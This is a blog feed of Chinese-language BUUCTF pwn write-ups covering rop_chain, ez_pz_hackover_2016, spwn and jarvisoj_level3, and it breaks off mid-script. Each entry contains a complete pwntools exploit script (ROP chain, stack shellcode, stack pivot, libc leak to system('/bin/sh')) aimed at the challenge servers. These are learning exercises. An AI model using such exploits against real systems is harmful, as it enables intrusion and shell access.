    <content type="html"><![CDATA[<h1 id="PicoCTF-2018-rop-chain"><a href="#PicoCTF-2018-rop-chain" class="headerlink" title="PicoCTF_2018_rop_chain"></a>PicoCTF_2018_rop_chain</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>在main函数里面的vuln()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在字符串中找到了flag.txt</p><p><img src="/2022/03/18/buuctf-PicoCTF-2018-rop-chain/image-20220318083607039.png" alt="image-20220318083607039"></p><p>我们看向flag.txt所在函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(&amp;s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我感觉主要的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br></pre></td></tr></table></figure><p>&amp;&amp;逻辑表达式,两个表达式为真才为真</p><p>然后a1==-559039827==0xDEADBAAD</p><p>我们要找或者给他传参这个win1与win2,在ida中也是有这个两个传参</p><p>win_function1()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win_function1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>win_function2()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win_function2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">-1163220307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>win_function2()这个函数里面要传参win1与a1==0xBAAAAAAD来达到条件然后把值win2==1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(win_function1)+p32(win_function2)+p32(flag)+p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br></pre></td></tr></table></figure><p>差不多就是这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27236</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">win_function1=<span class="number">0x080485CB</span></span><br><span class="line">win_function2=<span class="number">0x080485D8</span></span><br><span class="line">flag=<span class="number">0x0804862B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(win_function1)+p32(win_function2)+p32(flag)+p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PicoCTF-2018-rop-chain&quot;&gt;&lt;a href=&quot;#PicoCTF-2018-rop-chain&quot; class=&quot;headerlink&quot; title=&quot;PicoCTF_2018_rop_chain&quot;&gt;&lt;/a&gt;PicoCTF_2018_rop_cha</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ez_pz_hackover_2016</title>
    <link href="http://example.com/2022/03/18/buuctf-ez-pz-hackover-2016/"/>
    <id>http://example.com/2022/03/18/buuctf-ez-pz-hackover-2016/</id>
    <published>2022-03-18T00:24:20.000Z</published>
    <updated>2022-03-18T00:26:05.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-40Ch]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, &amp;s);<span class="comment">//打印出地址s</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(&amp;s, <span class="number">10</span>, v0);<span class="comment">//10就是换行符</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, &amp;s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s, <span class="string">&quot;crashme&quot;</span>);   <span class="comment">//判断字符串是否存在</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )<span class="comment">//如果存在</span></span><br><span class="line">    result = vuln((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln函数(漏洞点就在这)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl vuln(char src, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+6h] [ebp-32h]</span><br><span class="line"></span><br><span class="line">  return memcpy(&amp;dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fgets()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(s,100,stdin);</span><br></pre></td></tr></table></figure><p>第一个是数组，第二个是数组的大小，单位是：字节，第三参数代表：标准输入的意思</p><p>memchr()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memchr(const void *str, int c, size_t n)//</span><br></pre></td></tr></table></figure><p>str – 指向要执行搜索的内存块，</p><p>c – 以 int 形式传递的值，但是函数在每次字节搜索时是使用该值的无符号字符形式。</p><p>n – 要被分析的字节数</p><p>strcmp() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(const char *str1, const char *str2) //</span><br></pre></td></tr></table></figure><p>str1 – 要进行比较的第一个字符串</p><p>str2 – 要进行比较的第二个字符串</p><p>memcpy()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *str1, const void *str2, size_t n) </span><br></pre></td></tr></table></figure><p>str1 – 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</p><p><strong>str2</strong> – 指向要复制的数据源，类型强制转换为 void* 指针。</p><p><strong>n</strong> – 要被复制的字节数。</p><p>出题人的思路(自己想的)</p><p>fgets函数的值到&amp;s中但是这个fgets中不存在溢出,如果发生错误,返回一个空的指针,所以可以写入,写入的值为的长度为1023,strlen(&amp;s)查看当前s的长度赋值给V0,再次匹配memchr()的值10=\n换行,然后判断v3的值是否等于为空,</p><p>再进入到strcmp中对比crashme是否有,有的话进去vuln的函数,下面就直接溢出了memcpy函数直接复制到dest.</p><p>解题思路:<br>他开头不是给了我一个地址,那不是&amp;s的地址起始地址那我是不是可以将,绕过那些函数的判断,然后再溢出然后返回到&amp;s栈中的shellcode来达到getshell的目的</p><p>基本想法是有了,到底在最后溢出的数量上是否覆盖到ebp上,然后到我栈上执行shellcode的操作</p><p>那我们得算出dest的值离ebp相差多少?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>)+p32(stack-<span class="number">0x1c</span>)+shellcode</span><br></pre></td></tr></table></figure><p>crashme\x00=8个字节</p><p>‘a’*(0x16-8+4)=这个是将ebp覆盖掉+4</p><p>p32(stack-0x1c)=在s的开始段中填写shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>)+p32(stack_addr-<span class="number">0x1c</span>)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ez-pz-hackover-2016&quot;&gt;&lt;a href=&quot;#ez-pz-hackover-2016&quot; class=&quot;headerlink&quot; title=&quot;ez_pz_hackover_2016&quot;&gt;&lt;/a&gt;ez_pz_hackover_2016&lt;/h1&gt;&lt;figu</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-[Black Watch 入群题]PWN</title>
    <link href="http://example.com/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/"/>
    <id>http://example.com/2022/03/16/buuctf-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/</id>
    <published>2022-03-16T12:07:28.000Z</published>
    <updated>2022-03-16T12:08:40.464Z</updated>
    
    <content type="html"><![CDATA[<h1 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h1><p>查看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/4/spwn&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>运行一下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./spwn </span><br><span class="line">Hello good Ctfer!</span><br><span class="line">What is your name?aaaaaa</span><br><span class="line">What <span class="keyword">do</span> you want to say?aaaaa</span><br><span class="line">GoodBye!</span><br></pre></td></tr></table></figure><p>我看题目类型肯定是有溢出的.要不就是栈迁移.</p><p>查看伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vul_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);<span class="comment">//可以在s中写入很大值</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准的栈迁移,你看只能在s中输入很大的值,但是没办法溢出的,只有在buf那里可以溢出8个字节只够我们溢出到ret，那我们只能构建到到是s，来构造我们自己的system(‘/bin/sh’),所以我们需要先去泄漏libc.</p><p>需要打印出write的真实地址查出，并且让函数再次返回主函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;aaaa&quot; + p32(write_plt) + p32(main_addr)+p32(1) + p32(write_got) + p32(4)</span><br></pre></td></tr></table></figure><p>主要的是你第一次泄漏的地址是write的真实的地址,然后计算libc地址,第二次溢出,我将溢出的值迁移到第一次的栈上,来达到getshell的地步,所以要构造第一个的栈要getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26368)</span><br><span class="line">#p=process(&#x27;./spwn&#x27;)</span><br><span class="line">elf = ELF(&quot;spwn&quot;)</span><br><span class="line"></span><br><span class="line">bss_s = 0x0804A300#将fake栈迁移到bss中</span><br><span class="line">leave_ret = 0x08048511#栈迁移所需要的的地址</span><br><span class="line">write_plt = elf.plt[&quot;write&quot;]#plt表可以调用write函数</span><br><span class="line">write_got = elf.got[&quot;write&quot;]#got表里有write函数的真实地址</span><br><span class="line">main_addr = elf.sym[&quot;main&quot;]#控制函数执行流需要再次回到主函数</span><br><span class="line"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br><span class="line">payload = b&quot;aaaa&quot; + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(1) + p32(write_got) + p32(4)</span><br><span class="line">p.sendafter(&quot;name?&quot;, payload)#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br><span class="line"># 上面将一些执行流程写入了bss段</span><br><span class="line"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br><span class="line">payload = b&quot;a&quot; * 0x18 #这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(&quot;say?&quot;, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(4)) #接收泄露的地址</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23-32.so&quot;)</span><br><span class="line">libc_base = write_addr - libc.sym[&quot;write&quot;]#获取libc的基地址</span><br><span class="line">system_addr = libc_base + libc.sym[&quot;system&quot;]#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span><br><span class="line">binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span><br><span class="line"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="line"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br><span class="line">payload = b&quot;aaaa&quot; + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(&quot;name?&quot;, payload)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot; * 0x18 + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(&quot;say?&quot;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>小节:</p><p>leave相当于    </p><p>mov esp,ebp;</p><p>pop ebp;</p><p>ret相当于</p><p>pop eip;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;spwn&quot;&gt;&lt;a href=&quot;#spwn&quot; class=&quot;headerlink&quot; title=&quot;spwn&quot;&gt;&lt;/a&gt;spwn&lt;/h1&gt;&lt;p&gt;查看保护&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-jarvisoj_level3</title>
    <link href="http://example.com/2022/03/14/buuctf-jarvisoj-level3/"/>
    <id>http://example.com/2022/03/14/buuctf-jarvisoj-level3/</id>
    <published>2022-03-14T14:55:54.000Z</published>
    <updated>2022-03-14T14:56:35.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/king/study/ctf/pwn/buu/1/level3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found//没开</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>运行了一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./level3</span><br><span class="line">Input:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure><p>这种一般就是溢出加泄漏地址计算出libc的地址来达到getshell</p><p>话不多说看伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]//溢出</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是这个是基本功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26390</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">main=<span class="number">0x0804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+offset</span><br><span class="line">sh=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+offset</span><br><span class="line"></span><br><span class="line">payload1=<span 